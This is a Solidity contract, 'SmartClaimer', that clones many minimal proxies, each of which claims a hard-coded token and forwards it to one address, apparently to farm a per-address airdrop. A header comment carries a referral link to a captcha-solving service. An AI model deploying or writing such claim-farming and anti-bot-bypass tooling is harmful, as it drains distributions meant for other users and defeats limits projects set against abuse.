// SPDX-License-Identifier: MIT
// 验证码平台 https://www.nocaptcha.io/register?c=hLf08E
pragma solidity ^0.8.17;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    // smartToken
    function prepapreClaim() external;

    function claim() external;
}

contract SmartClaimer {
    //====== mini代理合约配置 ======//
    address private immutable owner =
    0x345495171A0eA4956F73D76D44c4ddD1e215D4fb;
    address private immutable original = address(this);
    IERC20 constant smartToken =
    IERC20(0x91fF962f7DE9865D3ca8CA151BAc28969F52F34b);
    // toAddress 对应的mini地址数量
    mapping(address => uint256) public miniAddressAmount;
    // toAddress 对应的 已经使用过的 index
    mapping(address => uint256) public miniAddressIndex;

    constructor() {}

    modifier onlyOwner() {
        require(
            owner == msg.sender || msg.sender == original,
            "Ownable: caller is not the owner"
        );
        _;
    }

    receive() external payable {}

    //查询合约内代币余额
    function getBalanceToken(
        address token
    ) public view virtual returns (uint256 balance) {
        balance = IERC20(token).balanceOf(address(this));
    }

    //提取合约内代币
    function withdrawToken(address token, address to) public onlyOwner {
        uint256 size;
        assembly {
            size := extcodesize(to)
        }
        require(size > 0, "Cannot withdraw to EOA");
        uint256 balance = getBalanceToken(token);
        require(balance > 0, "No token to withdraw");
        IERC20(token).transfer(to, balance);
    }

    //提取合约内eth
    function withdrawETH(address to) public onlyOwner {
        uint256 balance = address(this).balance;
        payable(to).transfer(balance);
    }

    //====== clone factory function ======//
    event NewClone(address clone, address owner);

    function creatMiniProxy(address toAddress, uint256 _num) external {
        uint256 N = miniAddressAmount[toAddress];
        for (uint256 i = N; i < N + _num; ++i) {
            address instance = cloneDeterministic(
                original,
                keccak256(abi.encodePacked(toAddress, i))
            );
            emit NewClone(instance, address(this));
        }
        miniAddressAmount[toAddress] = N + _num;
    }

    // 此函数用于 claim smartToken
    function mint_d22vi9okr4w(address toAddress) public {
        uint256 index = miniAddressIndex[toAddress];
        uint256 num = miniAddressAmount[toAddress];
        require(index < num, "No miniProxy to mint");
        SmartClaimer miniProxy = SmartClaimer(
            payable(proxyFor(toAddress, index))
        );
        miniProxy.claimSmartToken();
        miniProxy.withdrawToken(address(smartToken), toAddress);
        miniAddressIndex[toAddress] = index + 1;
    }

    function claimSmartToken() public {
        smartToken.prepapreClaim();
        smartToken.claim();
    }

    //====== clone factory function ======//
    function cloneDeterministic(
        address implementation,
        bytes32 salt
    ) internal returns (address instance) {
        /// @solidity memory-safe-assembly
        assembly {
        // Cleans the upper 96 bits of the `implementation` word, then packs the first 3 bytes
        // of the `implementation` address with the bytecode before the address.
            mstore(
                0x00,
                or(
                    shr(0xe8, shl(0x60, implementation)),
                    0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000
                )
            )
        // Packs the remaining 17 bytes of `implementation` with the bytecode after the address.
            mstore(
                0x20,
                or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3)
            )
            instance := create2(0, 0x09, 0x37, salt)
        }
        require(instance != address(0), "ERC1167: create2 failed");
    }

    function predictDeterministicAddress(
        address implementation,
        bytes32 salt,
        address deployer
    ) internal pure returns (address predicted) {
        /// @solidity memory-safe-assembly
        assembly {
            let ptr := mload(0x40)
            mstore(add(ptr, 0x38), deployer)
            mstore(add(ptr, 0x24), 0x5af43d82803e903d91602b57fd5bf3ff)
            mstore(add(ptr, 0x14), implementation)
            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73)
            mstore(add(ptr, 0x58), salt)
            mstore(add(ptr, 0x78), keccak256(add(ptr, 0x0c), 0x37))
            predicted := keccak256(add(ptr, 0x43), 0x55)
        }
    }

    function proxyFor(
        address toAddress,
        uint256 index
    ) public view returns (address predicted) {
        /// @solidity memory-safe-assembly
        predicted = predictDeterministicAddress(
            original,
            keccak256(abi.encodePacked(toAddress, index)),
            address(this)
        );
    }
}
